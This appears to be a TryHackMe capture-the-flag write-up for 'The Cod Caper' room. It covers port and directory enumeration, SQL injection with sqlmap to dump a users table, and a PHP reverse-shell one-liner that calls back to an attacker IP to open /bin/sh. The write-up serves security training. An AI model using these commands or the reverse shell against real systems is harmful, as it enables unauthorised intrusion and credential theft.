# TryHackMe-The_Cod_Caper-WriteUp
My solution for the room called "The Cod Craper" in TryHackMe

## Host Enumeration 

<p> The first step is to see what ports and services are running on the target machine. 
Recommended Tool - nmap:
Useful flags: -p -sC -A </p>

<p> To answer this questions we need to scan the machine with nmap and analyze the results</p>

```nmap 
nmap -A <IP> -vv
```
![nmap](https://user-images.githubusercontent.com/67475596/103458587-e65f9400-4d09-11eb-85da-2f2e1c717200.png)

We can see that there are two port open, 22 with ssh service and port 80 with http


**Question 1:** How many ports are open on the target machine? <br>
<code> 2 </code>

**Question 2:** What is the http-title of the web server? <br>
<code> Apache2 Ubuntu Default Page: It works </code>

**Question 3:** What version is the ssh service? <br>
<code> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 </code>

**Question 4:** What is the version of the web server? <br>
<code> Apache/2.4.18 </code>

## Web Enumeration 

<p> Since the only services running are SSH and Apache, it is safe to assume that we should check out the web server first for possible vulnerabilities. One of the first things to do is to see what pages are available to access on the web server.
Recommended tool: gobuster
Useful flags: -x --url --wordlist 
	
Recommended wordlist: big.txt </p>

![default page](https://user-images.githubusercontent.com/67475596/103477313-f9cc3700-4dbd-11eb-877f-d61c426166f8.png)

<p>If we open the ip on a browser we can see that there is the default page of Apache2 Ubuntu <br>
Now let's scan the ip with gobuster for enumerate some directories and files.</p>

```bash 
gobuster dir -u http://IP/ -w big.txt -x .php,.html,.txt
```

![gobuster](https://user-images.githubusercontent.com/67475596/103477366-9262b700-4dbe-11eb-8479-c080708fcaa9.png)

Here we are.. we found the important file !


**Question 1 :** What is the name of the important file on the server? <br>
<code> administrator.php </code>

## Web Exploitation

<p>The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection. <br>

Recommended Tool: sqlmap

Useful Flags: -u --forms --dump -a

On the page IP/administrator.php we have an administrator login 

![login](https://user-images.githubusercontent.com/67475596/103477577-8c6dd580-4dc0-11eb-9179-4bf229f46f7e.png)

Let's try an SQL Injection with sqlmap <br>

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

but first we need to intercept the http request with burpsuite

![request](https://user-images.githubusercontent.com/67475596/103477728-cd1a1e80-4dc1-11eb-81f6-f7f78922c1bb.png)

now save it in a .txt file and then launch sqlmap

```bash
sqlmap -r request.txt -D users --tables
```


![sqlmap 1](https://user-images.githubusercontent.com/67475596/103477764-0c486f80-4dc2-11eb-8381-22f1d908bc69.png)

Mmmh... interesting we found some databases :)

![sqlmap 2](https://user-images.githubusercontent.com/67475596/103477797-592c4600-4dc2-11eb-98a8-ae36a56d3c15.png)

Let's check "users"

```bash
sqlmap -r request.txt -D users -T users --dump
```

![sqlmap 3](https://user-images.githubusercontent.com/67475596/103477822-9a245a80-4dc2-11eb-9629-02cb1b129a2b.png)

Here are the username and password !

![user pass sqlmap](https://user-images.githubusercontent.com/67475596/103477845-d9eb4200-4dc2-11eb-906a-61f035ae8e09.jpg)


**Question 1:** What is the admin username? <br>

**Question 2:** What is the admin password? <br>

**Question 3:** How many forms of SQLI is the form vulnerable to? <br>
<code> 3 </code>

![sql1](https://user-images.githubusercontent.com/67475596/103491639-d9d05e00-4e25-11eb-88be-fbc4db8cef33.png)
![sql2](https://user-images.githubusercontent.com/67475596/103491642-dc32b800-4e25-11eb-88b2-7026454113c4.png)
![sql3](https://user-images.githubusercontent.com/67475596/103491644-dccb4e80-4e25-11eb-8d12-2ab8077ca7ef.png)
</p>

## Command Execution

<p> It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access! </p>

<p> Now we have the credentials found with sqlmap <br>
Let's do the log in </p>

Ouch ... another form <br>
![run_command](https://user-images.githubusercontent.com/67475596/103491811-f8832480-4e26-11eb-99ef-e6f307ee9b77.png)

<p> Now let's try to get a reverse shell with netcat <br>
  but first prepare a php shell

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![run command](https://user-images.githubusercontent.com/67475596/103491856-48fa8200-4e27-11eb-8d09-7379187a7886.png)
</p>


**Question 1:** How many files are in the current directory? <br>
<code> 3 </code>

**Question 2:** Do I still have an account <br>
<code> yes </code>

**Question 3:** What is my ssh password? <br>
